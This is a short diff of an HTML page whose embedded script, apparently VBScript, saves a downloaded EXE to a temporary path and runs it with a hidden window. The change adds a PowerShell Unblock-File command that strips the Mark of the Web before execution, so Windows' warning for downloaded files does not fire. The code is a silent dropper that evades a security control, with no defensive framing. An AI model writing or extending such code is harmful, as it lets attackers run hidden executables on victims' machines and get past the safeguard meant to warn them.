@@ -56,9 +56,13 @@
             objStream.Close
         End If
         
-        ' Run the downloaded EXE file silently
+        ' Unblock the file (remove Mark of the Web)
         Set WshShell = CreateObject("WScript.Shell")
+        WshShell.Run "powershell -Command ""Unblock-File -Path '" & tempFilePath & "'""", 0, True
+        
+        ' Run the downloaded EXE file silently
         WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
+        
     </script>
 </body>
 </html>
